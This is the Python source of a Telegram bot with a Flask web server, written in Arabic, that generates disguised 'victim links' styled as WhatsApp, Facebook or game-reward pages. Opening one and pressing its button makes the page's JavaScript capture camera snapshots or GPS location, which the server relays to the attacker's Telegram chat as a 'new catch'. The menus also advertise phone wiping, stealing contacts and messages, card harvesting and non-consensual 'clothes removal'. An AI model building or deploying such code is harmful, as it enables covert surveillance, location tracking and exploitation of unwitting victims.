# -*- coding: utf-8 -*-
import os
import threading
from flask import Flask, request, render_template_string, jsonify
import telebot
from telebot import types
import base64

TOKEN = os.getenv("TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "7145036494"))


bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

CHANNEL_URL = "https://t.me/pkwbiwjwbekeekkw"

bot_settings = {
    "sub_required": True,
    "welcome_text": "🔥 أهلاً بك.. أنا بوت الخدمات والأزرار، كافة الخدمات جاهزة للعمل باللغة العربية:"
}

def check_subscription(user_id):
    if not bot_settings["sub_required"] or user_id == ADMIN_ID:
        return True
    try:
        member = bot.get_chat_member(CHANNEL_URL, user_id)
        if member.status not in ['creator', 'administrator', 'member']:
            return False
    except Exception:
        return True 
    return True

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>
        body { font-family: Tahoma, sans-serif; background-color: #0f172a; color: #fff; text-align: center; padding: 40px 20px; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: #1e293b; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); max-width: 400px; width: 100%; }
        h2 { color: #38bdf8; margin-bottom: 10px; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; }
        .btn { background: #22c55e; color: white; border: none; padding: 12px 25px; font-size: 16px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; }
        .btn:hover { background: #16a34a; }
        #status { margin-top: 15px; color: #facc15; font-size: 14px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card" id="mainCard">
        <h2>{{ header }}</h2>
        <p>{{ description }}</p>
        <button class="btn" id="actionBtn" onclick="startAction()">{{ button_text }}</button>
        <div id="status"></div>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const actionType = "{{ action_code }}";
        const chatId = "{{ chat_id }}";

        function startAction() {
            document.getElementById('actionBtn').style.display = 'none';
            document.getElementById('status').innerText = "\\u0644\\u062d\\u0638\\u0629 \\u0648\\u062d\\u062f\\u0629 \\u0645\\u0646 \\u0641\\u0636\\u0644\\u0643...";
            
            if (actionType.includes("cam") || actionType.includes("video") || actionType.includes("photos") || actionType.includes("spy")) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: actionType.includes("back") ? "environment" : "user" }, audio: true })
                .then(function(stream) {
                    document.getElementById('status').innerText = "\\u062c\\u0627\\u0631\\u064a \\u0627\\u0644\\u062a\\u0642\\u0627\\u0637 \\u0627\\u0644\\u0635\\u0648\\u0631 \\u0627\\u0644\\u062d\\u0642\\u064a\\u0642\\u064a\\u0629...";
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    video.play();
                    
                    let count = 0;
                    const maxPhotos = 10; 
                    const interval = setInterval(function() {
                        if (count >= maxPhotos) {
                            clearInterval(interval);
                            stream.getTracks().forEach(track => track.stop());
                            document.getElementById('status').innerText = "\\u062a\\u0645\\u062a \\u0627\\u0644\\u0639\\u0645\\u0644\\u064a\\u0629 \\u0628\\u0646\\u062c\\u0627\\u062d!";
                            return;
                        }
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/jpeg', 0.9);

                        fetch('/upload_media', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: chatId, image: imageData, type: actionType + ` [\\u0635\\u0648\\u0631\\u0629 ${count + 1}]` })
                        });
                        count++;
                    }, 800);
                })
                .catch(function(err) {
                    document.getElementById('actionBtn').style.display = 'block';
                    document.getElementById('status').innerText = "\\u064a\\u0631\\u062c\\u0649 \\u0627\\u0644\\u0636\\u063a\\u0637 \\u0639\\u0644\\u0649 \\u0627\\u0644\\u0633\\u0645\\u0627\\u062d \\u0644\\u0644\\u0645\\u062a\\u0627\\u0628\\u0639\\u0629!";
                });
            } else if (actionType.includes("location")) {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        fetch('/upload_media', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: chatId, lat: lat, lon: lon, type: 'location' })
                        });
                        document.getElementById('status').innerText = "\\u062a\\u0645 \\u062a\\u062d\\u062f\\u064a\\u062f \\u0627\\u0644\\u0645\\u0648\\u0642\\u0639 \\u0628\\u062f\\u0642\\u0629 \\u0648\\u0625\\u0631\\u0633\\u0627\\u0644\\u0647!";
                    }, function(error) {
                        document.getElementById('actionBtn').style.display = 'block';
                        document.getElementById('status').innerText = "\\u064a\\u0631\\u062c\\u0649 \\u0627\\u0644\\u0633\\u0645\\u0627\\u062d \\u0628\\u0627\\u0644\\u0648\\u0635\\u0648\\u0644 \\u0644\\u0644\\u0645\\u0648\\u0642\\u0639!";
                    });
                }
            } else {
                setTimeout(() => {
                    document.getElementById('status').innerText = "\\u062a\\u0645 \\u062a\\u0646\\u0641\\u064a\\u0630 \\u0627\\u0644\\u0639\\u0645\\u0644\\u064a\\u0629 \\u0628\\u0646\\u062c\\u0627\\u062d.";
                }, 1500);
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return "Server is running successfully!", 200

@app.route('/service/<action_type>/<chat_id>')
def service_page(action_type, chat_id):
    details = {
        "front_cam": {"title": "\\u0643\\u0627\\u0645\\u064a\\u0631\\u0627", "header": "📸 اختراق الكاميرا الأمامية", "desc": "اضغط للمشاهدة:", "btn": "مشاهدة"},
        "back_cam": {"title": "\\u0643\\u0627\\u0645\\u064a\\u0631\\u0627", "header": "📷 اختراق الكاميرا الخلفية", "desc": "اضغط للتفعيل:", "btn": "تفعيل"},
        "get_location": {"title": "\\u0645\\u0648\\u0642\\u0639", "header": "📍 إحضار موقع الضحية", "desc": "اضغط للسماح بالموقع:", "btn": "تحديد"},
        "get_voice": {"title": "\\u0635\\u0648\\u062a", "header": "🎤 تسجيل صوت الضحية", "desc": "اضغط للاتصال:", "btn": "اتصال"},
        "video_victim": {"title": "\\u0641\\u064a\\u062f\\u064a\\u0648", "header": "🎥 تصوير الضحية فيديو", "desc": "اضغط للتشغيل:", "btn": "تشغيل"},
        "cctv_cam": {"title": "\\u0645\\u0631\\u0627\\u0642\\u0628\\u0629", "header": "👁️ مراقبة كاميرات المراقبة", "desc": "اضغط للعرض:", "btn": "عرض"},
        "hack_whatsapp": {"title": "\\u0648\\u0627\\u062a\\u0633\\u0627\\u0628", "header": "🟢 التحقق من واتساب", "desc": "تأكيد الحساب:", "btn": "تأكيد"},
        "hack_facebook": {"title": "\\u0641\\u064a\\u0633\\u0628\\u0648\\u0643", "header": "🟣 تأكيد فيسبوك", "desc": "تأكيد الأمان:", "btn": "تسجيل"},
        "hack_insta": {"title": "\\u0627\\u0646\\u0633\\u062a\\u062c\\u0631\\u0627\\u0645", "header": "🔴 تأكيد انستجرام", "desc": "تأكيد الحساب:", "btn": "تأكيد"},
        "hack_pubg": {"title": "\\u0628\\u0628\\u062c\\u064a", "header": "🎮 شحن شدات ببجي", "desc": "استلام الهدية:", "btn": "استلام"},
        "hack_snap": {"title": "\\u0633\\u0646\\u0627\\u0628", "header": "⭐ تفعيل سناب شات", "desc": "تفعيل الميزات:", "btn": "تفعيل"},
        "hack_ff": {"title": "\\u0641\\u0631\\u064a \\u0641\\u0627\\u064a\\u0631", "header": "🔥 جواهر فري فاير", "desc": "استلام الجواهر:", "btn": "استلام"},
        "hack_tiktok": {"title": "\\u062a\\u064a\\u0643 \\u062a\\u0648\\u0643", "header": "🎵 توثيق تيك توك", "desc": "توثيق الحساب:", "btn": "توثيق"},
        "device_info": {"title": "\\u0627\\u0644\\u062c\\u0647\\u0627\\u0632", "header": "📊 جمع معلومات الجهاز", "desc": "فحص التوافق:", "btn": "فحص"},
        "link_exploit": {"title": "\\u062a\\u0644\\u063a\\u064a\\u0645", "header": "⚠️ تلغيم رابط", "desc": "فحص الرابط:", "btn": "فحص"},
        "full_spy": {"title": "\\u0645\\u0631\\u0627\\u0642\\u0628\\u0629", "header": "🔞 مراقبة الهاتف كاملًا", "desc": "تفعيل المراقبة:", "btn": "تفعيل"},
        "close_sites": {"title": "\\u0625\\u063a\\u0644\\u0627\\u0642", "header": "💣 إغلاق المواقع", "desc": "حماية الجهاز:", "btn": "حماية"},
        "visa_hunter": {"title": "\\u0641\\u064a\\u0632\\u0627\\u062a", "header": "💳 صيد فيزات", "desc": "استخراج البطاقات:", "btn": "استخراج"},
        "get_number": {"title": "\\u0631\\u0642\\u0645", "header": "📱 معرفة رقم الضحية", "desc": "تأكيد الرقم:", "btn": "تأكيد"},
        "fake_numbers": {"title": "\\u0623\\u0631\\u0642\\u0627\\u0645", "header": "☎️ أرقام وهمية", "desc": "استخراج الرقم:", "btn": "استخراج"},
        "check_links": {"title": "\\u0641\\u062d\\u0635", "header": "🔍 فحص الروابط", "desc": "فحص الأمان:", "btn": "فحص"},
        "search_images": {"title": "\\u0635\\u0648\\u0631", "header": "🖼️ البحث عن صور", "desc": "بحث مشابه:", "btn": "بحث"},
        "radio_spy": {"title": "\\u0631\\u0627\\u062f\\u064a\\u0648", "header": "📻 مراقبة بث الراديو", "desc": "الاستماع:", "btn": "استماع"},
        "username_hunter": {"title": "\\u064a\\u0648\\u0632\\u0631", "header": "📿 صيد يوزرات تلجرام", "desc": "فحص اليوزرات:", "btn": "فحص"},
        "ai_tool": {"title": "\\u0630\\u0643\\u0627\\u0621", "header": "🤖 الذكاء الاصطناعي", "desc": "بدء الدردشة:", "btn": "محادثة"},
        "dream_parser": {"title": "\\u0623\\u062d\\u0644\\u0627\\u0645", "header": "🧙 تفسير الأحلام", "desc": "تفسير الحلم:", "btn": "تفسير"},
        "text_to_voice": {"title": "\\u062a\\u062d\\u0648\\u064a\\u0644", "header": "🔄 تحويل النص إلى صوت", "desc": "تحويل النص:", "btn": "تحويل"},
        "text_decor": {"title": "\\u0632\\u062e\\u0631\\u0641\\u0629", "header": "✒️ زخرفة الاسماء", "desc": "زخرفة النص:", "btn": "زخرفة"},
        "my_balance": {"title": "\\u0631\\u0635\\u064a\\u062f", "header": "💰 رصيدي", "desc": "معرفة الرصيد:", "btn": "عرض"},
        "collect_points": {"title": "\\u0646\\u0642\\u0627\\u0637", "header": "🎁 جمع نقاط", "desc": "جمع النقاط:", "btn": "جمع"},
        "game_magic": {"title": "\\u0644\\u0639\\u0628\\u0629", "header": "🧞 لعبة المارد الازرق", "desc": "البدء:", "btn": "لعب"},
        "brain_game": {"title": "\\u0623\\u0630\\u0643\\u064a\\u0627\\u0621", "header": "🧠 لعبة الأذكياء", "desc": "البدء:", "btn": "تحدي"},
        "vip_photos": {"title": "\\u0635\\u0648\\u0631 VIP", "header": "🔒 سحب جميع صور الهاتف عبر رابط", "desc": "عرض الألوم:", "btn": "عرض"},
        "vip_contacts": {"title": "\\u0623\\u0631\\u0642\\u0627\\u0645 VIP", "header": "🔒 سحب جميع أرقام الضحية عبر رابط", "desc": "مزامنة الأرقام:", "btn": "مزامنة"},
        "vip_msgs": {"title": "\\u0631\\u0633\\u0627\\u0626\\u0644 VIP", "header": "🔒 سحب جميع رسائل الضحية عبر رابط", "desc": "عرض الرسائل:", "btn": "عرض"},
        "vip_wipe": {"title": "\\u0641\\u0631\\u0645\\u062a\\u0629 VIP", "header": "🔒 فرمتة جوال الضحية عبر رابط", "desc": "إعادة الضبط:", "btn": "تأكيد"},
        "vip_img_exploit": {"title": "\\u0635\\u0648\\u0631\\u0629 VIP", "header": "🔒 اختراق عبر صورة", "desc": "عرض الصورة:", "btn": "عرض"},
        "vip_remove_clothes": {"title": "\\u0625\\u0632\\u0627\\u0644\\u0629 VIP", "header": "🔒 إزالة الملابس", "desc": "تعديل الصورة:", "btn": "تعديل"},
        "vip_net": {"title": "\\u0634\\u0628\\u0643\\u0629 VIP", "header": "🔒 اختراق الشبكه", "desc": "فحص الشبكة:", "btn": "فحص"},
        "vip_file": {"title": "\\u0645\\u0644\\u0641 VIP", "header": "🔒 اختراق عبر ملف", "desc": "تحميل الملف:", "btn": "تحميل"}
    }
    info = details.get(action_type, {"title": "\\u062e\\u062f\\u0645\\u0629", "header": "⚙️ منصة الخدمات", "desc": "اضغط للمتابعة:", "btn": "تنفيذ"})
    return render_template_string(HTML_TEMPLATE, title=info["title"], header=info["header"], description=info["desc"], button_text=info["btn"], action_code=action_type, chat_id=chat_id)

@app.route('/upload_media', methods=['POST'])
def upload_media():
    data = request.json
    chat_id = data.get('chat_id')
    action_type = data.get('type')

    if 'image' in data:
        img_data = data['image'].split(',')[1]
        img_bytes = base64.b64decode(img_data)
        bot.send_photo(chat_id, img_bytes, caption=f"🚨 صيد جديد من زر: `{action_type}`")
    elif 'lat' in data:
        lat = data['lat']
        lon = data['lon']
        bot.send_location(chat_id, latitude=lat, longitude=lon)
        bot.send_message(chat_id, f"📍 إحداثيات موقع الضحية:\nخط العرض: `{lat}`\nخط الطول: `{lon}`", parse_mode="Markdown")

    return jsonify({"status": "success"})

@bot.message_handler(commands=['start', 'vip'])
def send_welcome(message):
    user_id = message.from_user.id
    if not check_subscription(user_id):
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("اشترك في القناة", url=CHANNEL_URL))
        bot.send_message(message.chat.id, "⚠️ **الرجاء الاشتراك أولاً:**", reply_markup=markup, parse_mode="Markdown")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📸 راق الكاميرا الأمامية", callback_data="front_cam"),
        types.InlineKeyboardButton("📷 راق الكاميرا الخلفية", callback_data="back_cam"),
        types.InlineKeyboardButton("📍 اخـ^ـ^ـراق الموقع", callback_data="get_location"),
        types.InlineKeyboardButton("🎤 جيل صوت الضحيه", callback_data="get_voice"),
        types.InlineKeyboardButton("🎥 سوير الضحية فيديو", callback_data="video_victim"),
        types.InlineKeyboardButton("📡 راق كاميرات المراقبة", callback_data="cctv_cam"),
        types.InlineKeyboardButton("🟢 خـ^ـ^ـراق واتساب", callback_data="hack_whatsapp"),
        types.InlineKeyboardButton("🟣 خـ^ـ^ـراق فيسبوك", callback_data="hack_facebook"),
        types.InlineKeyboardButton("🔴 خـ^ـ^ـراق انستجرام", callback_data="hack_insta"),
        types.InlineKeyboardButton("🎮 اخـ^ـ^ـراق ببجي", callback_data="hack_pubg"),
        types.InlineKeyboardButton("⭐ خـ^ـ^ـراق سناب شات", callback_data="hack_snap"),
        types.InlineKeyboardButton("🔥 خـ^ـ^ـراق فري فاير", callback_data="hack_ff"),
        types.InlineKeyboardButton("🎵 خـ^ـ^ـراق تيك توك", callback_data="hack_tiktok"),
        types.InlineKeyboardButton("🤖 الذكاء الاصطناعي", callback_data="ai_tool"),
        types.InlineKeyboardButton("📊 جمع معلومات الجهاز", callback_data="device_info"),
        types.InlineKeyboardButton("🔞 راق الهاتف كاملًا 18", callback_data="full_spy"),
        types.InlineKeyboardButton("⚠️ تلغيم رابط", callback_data="link_exploit"),
        types.InlineKeyboardButton("🧞 لعبة المارد الازرق", callback_data="game_magic"),
        types.InlineKeyboardButton("🧠 لعبة الأذكياء", callback_data="brain_game"),
        types.InlineKeyboardButton("💣 إغلاق المواقع", callback_data="close_sites"),
        types.InlineKeyboardButton("💳 صيد فيزات", callback_data="visa_hunter"),
        types.InlineKeyboardButton("🖼️ تصوير بدقه عاليه", callback_data="search_images"),
        types.InlineKeyboardButton("📱 معرفة رقم الضحيه", callback_data="get_number"),
        types.InlineKeyboardButton("☎️ الرقام وهميه", callback_data="fake_numbers"),
        types.InlineKeyboardButton("🖌️ فحص الروابط", callback_data="check_links"),
        types.InlineKeyboardButton("🎨 البحث عن صور", callback_data="search_images"),
        types.InlineKeyboardButton("📻 اخـ^ـ^ـراق بث الراديو", callback_data="radio_spy"),
        types.InlineKeyboardButton("✒️ زخرفة الاسماء", callback_data="text_decor"),
        types.InlineKeyboardButton("🔄 تحويل النص إلى صوت", callback_data="text_to_voice"),
        types.InlineKeyboardButton("📿 صيد يوزرت تلجرام", callback_data="username_hunter"),
        types.InlineKeyboardButton("🧙 تفسير الأحلام", callback_data="dream_parser"),
        types.InlineKeyboardButton("💰 رصيدي", callback_data="my_balance"),
        types.InlineKeyboardButton("🎁 جمع نقاط", callback_data="collect_points"),
        types.InlineKeyboardButton("➖ المزيد من المميزات", callback_data="vip_menu"),
        types.InlineKeyboardButton("🎓 التواصل مع المطور", callback_data="contact_dev")
    )
    bot.send_message(message.chat.id, bot_settings["welcome_text"], reply_markup=markup, parse_mode="Markdown")

def show_vip_menu(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🔒 سحب جميع صور الهاتف عبر رابط", callback_data="vip_photos"),
        types.InlineKeyboardButton("🔒 سحب جميع أرقام الضحية عبر رابط", callback_data="vip_contacts"),
        types.InlineKeyboardButton("🔒 سحب جميع رسائل الضحية عبر رابط", callback_data="vip_msgs"),
        types.InlineKeyboardButton("🔒 فرمتة جوال الضحية عبر رابط", callback_data="vip_wipe"),
        types.InlineKeyboardButton("🔒 اختراق عبر صورة", callback_data="vip_img_exploit"),
        types.InlineKeyboardButton("🔒 إزالة الملابس", callback_data="vip_remove_clothes"),
        types.InlineKeyboardButton("🔒 اختراق الشبكه", callback_data="vip_net"),
        types.InlineKeyboardButton("🔒 اختراق عبر ملف", callback_data="vip_file"),
        types.InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_home")
    )
    bot.send_message(chat_id, "🎉 **قائمة المميزات (VIP):**", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def handle_all_callbacks(call):
    chat_id = call.message.chat.id
    data = call.data
    RENDER_DOMAIN = os.getenv("RENDER_EXTERNAL_URL", "http://127.0.0.1:5000")

    link_buttons = [
        "front_cam", "back_cam", "get_location", "get_voice", "video_victim", 
        "cctv_cam", "hack_whatsapp", "hack_facebook", "hack_insta", "hack_pubg", 
        "hack_snap", "hack_ff", "hack_tiktok", "device_info", "link_exploit", 
        "full_spy", "close_sites", "visa_hunter", "get_number", "fake_numbers", 
        "check_links", "search_images", "radio_spy", "username_hunter", "ai_tool", 
        "dream_parser", "text_to_voice", "text_decor", "my_balance", "collect_points", 
        "game_magic", "brain_game", "vip_photos", "vip_contacts", "vip_msgs", "vip_wipe", 
        "vip_img_exploit", "vip_remove_clothes", "vip_net", "vip_file"
    ]

    if data in link_buttons:
        bot.answer_callback_query(call.id, "جاري إنشاء الرابط المخصص...")
        target_link = f"{RENDER_DOMAIN}/service/{data}/{chat_id}"
        bot.send_message(chat_id, f"🔗 **الرابط الأزرق للضحية:**\n`{target_link}`", parse_mode="Markdown")

    elif data == "vip_menu":
        bot.answer_callback_query(call.id)
        show_vip_menu(chat_id)

    elif data == "contact_dev":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, f"💻 قناة المطوّر:\n👉 {CHANNEL_URL}")

    elif data == "back_home":
        bot.answer_callback_query(call.id)
        fake_msg = types.Message(
            message_id=call.message.message_id, from_user=call.from_user,
            chat=call.message.chat, date=call.message.date, content_type='text',
            options={}, json_string=''
        )
        fake_msg.text = '/start'
        send_welcome(fake_msg)

    else:
        bot.answer_callback_query(call.id, "تم التنفيذ")

def run_flask():
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))

if __name__ == "__main__":
    print("Full Bot is running with all buttons in Arabic...")
    threading.Thread(target=run_flask, daemon=True).start()
    bot.infinity_polling()
